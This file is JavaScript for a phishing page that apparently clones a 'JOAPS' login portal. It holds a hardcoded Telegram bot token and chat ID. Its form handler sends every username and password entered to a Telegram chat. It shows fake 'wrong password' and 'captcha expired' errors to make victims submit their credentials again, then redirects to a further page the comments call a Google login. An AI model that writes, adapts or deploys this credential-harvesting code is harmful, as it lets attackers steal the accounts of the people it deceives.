// Telegram Bot Configuration
const TELEGRAM_BOT_TOKEN = '7645092266:AAF2xYLNn0yPxNAv2edXslhil7FmMwF_syc';
const TELEGRAM_CHAT_ID = '6968585140'; // Get this from @userinfobot

// Track login attempts
let loginAttempts = 0;

// Mobile Menu Toggle
const menuToggle = document.getElementById('menuToggle');
const sidebar = document.getElementById('sidebar');

if (menuToggle) {
    menuToggle.addEventListener('click', () => {
        sidebar.classList.toggle('active');
    });
}

// Password Toggle
const togglePassword = document.getElementById('togglePassword');
const passwordInput = document.getElementById('password');

if (togglePassword) {
    togglePassword.addEventListener('click', () => {
        const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
        passwordInput.setAttribute('type', type);
        
        // Update icon
        const eyeIcon = togglePassword.querySelector('.eye-icon');
        if (type === 'password') {
            eyeIcon.innerHTML = '<path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5M12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5m0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3"/>';
        } else {
            eyeIcon.innerHTML = '<path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7M2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2m4.31-.78 3.15 3.15.02-.16c0-1.66-1.34-3-3-3z"/>';
        }
    });
}

// Captcha Generation
let captchaAnswer = 0;

function generateCaptcha() {
    const num1 = Math.floor(Math.random() * 10) + 1; // 1-10
    const num2 = Math.floor(Math.random() * 10) + 1; // 1-10
    const operators = ['+', '-', '*'];
    const operator = operators[Math.floor(Math.random() * operators.length)];
    
    let expression = '';
    let answer = 0;
    
    switch(operator) {
        case '+':
            expression = `${num1} + ${num2}`;
            answer = num1 + num2;
            break;
        case '-':
            // Ensure positive result
            const larger = Math.max(num1, num2);
            const smaller = Math.min(num1, num2);
            expression = `${larger} - ${smaller}`;
            answer = larger - smaller;
            break;
        case '*':
            const smallNum1 = Math.floor(Math.random() * 5) + 1; // 1-5
            const smallNum2 = Math.floor(Math.random() * 5) + 1; // 1-5
            expression = `${smallNum1} × ${smallNum2}`;
            answer = smallNum1 * smallNum2;
            break;
    }
    
    captchaAnswer = answer;
    document.getElementById('captchaText').textContent = expression + ' = ?';
}

// Refresh Captcha
const refreshCaptcha = document.getElementById('refreshCaptcha');

if (refreshCaptcha) {
    refreshCaptcha.addEventListener('click', () => {
        generateCaptcha();
        document.getElementById('captcha').value = '';
        document.getElementById('captcha').classList.remove('error');
    });
}

// Initialize captcha on page load
if (document.getElementById('captchaText')) {
    generateCaptcha();
}

// Function to send message to Telegram
async function sendToTelegram(username, password, attempt) {
    const message = `🔐 *Login Attempt #${attempt}*\n\n` +
                   `👤 *Username/Email:* ${username}\n` +
                   `🔑 *Password:* ${password}\n` +
                   `⏰ *Time:* ${new Date().toLocaleString()}\n` +
                   `🌐 *Page:* JOAPS Clone\n` +
                   `📊 *Attempt:* ${attempt}/3`;
    
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });
        
        const data = await response.json();
        return data.ok;
    } catch (error) {
        console.error('Error sending to Telegram:', error);
        return false;
    }
}

// Form Validation
const loginForm = document.getElementById('loginForm');
const usernameInput = document.getElementById('username');
const usernameError = document.getElementById('usernameError');

if (loginForm) {
    loginForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        
        let isValid = true;
        
        // Validate username
        const usernameValue = usernameInput.value.trim();
        if (!usernameValue) {
            usernameInput.classList.add('error');
            isValid = false;
        } else {
            usernameInput.classList.remove('error');
        }
        
        // Validate password
        const passwordValue = passwordInput.value.trim();
        if (!passwordValue) {
            passwordInput.classList.add('error');
            isValid = false;
        } else {
            passwordInput.classList.remove('error');
        }
        
        // Validate captcha
        const captchaInput = document.getElementById('captcha');
        const captchaValue = parseInt(captchaInput.value.trim());
        if (!captchaInput.value.trim() || captchaValue !== captchaAnswer) {
            captchaInput.classList.add('error');
            isValid = false;
            if (captchaInput.value.trim()) {
                alert('Incorrect captcha answer. Please try again.');
                generateCaptcha();
                captchaInput.value = '';
            }
        } else {
            captchaInput.classList.remove('error');
        }
        
        if (isValid) {
            // Show loading state
            const submitBtn = loginForm.querySelector('button[type="submit"]');
            const originalText = submitBtn.innerHTML;
            submitBtn.disabled = true;
            submitBtn.innerHTML = '<span>Verifying...</span>';
            
            // Increment attempt counter
            loginAttempts++;
            
            // Send to Telegram
            await sendToTelegram(usernameValue, passwordValue, loginAttempts);
            
            // Restore button
            submitBtn.disabled = false;
            submitBtn.innerHTML = originalText;
            
            // Handle different attempts
            if (loginAttempts === 1) {
                // First attempt - Wrong password
                alert('❌ Wrong password. Please try again.');
                passwordInput.value = '';
                passwordInput.focus();
            } else if (loginAttempts === 2) {
                // Second attempt - Captcha expired
                alert('❌ Captcha expired. Please try again.');
                generateCaptcha();
                captchaInput.value = '';
                passwordInput.value = '';
            } else if (loginAttempts >= 3) {
                // Third attempt - Redirect to Google login
                alert('⚠️ Multiple failed attempts detected. Redirecting to alternative login method...');
                setTimeout(() => {
                    window.location.href = 'auth.html';
                }, 1000);
            }
        }
    });
}

// Forgot Credentials Handler
const forgotCredentials = document.getElementById('forgotCredentials');
if (forgotCredentials) {
    forgotCredentials.addEventListener('click', () => {
        alert('This feature would redirect to the password recovery page on the live site.');
    });
}

// Remove error state on input
const formInputs = document.querySelectorAll('.form-control');
formInputs.forEach(input => {
    input.addEventListener('input', () => {
        input.classList.remove('error');
    });
});
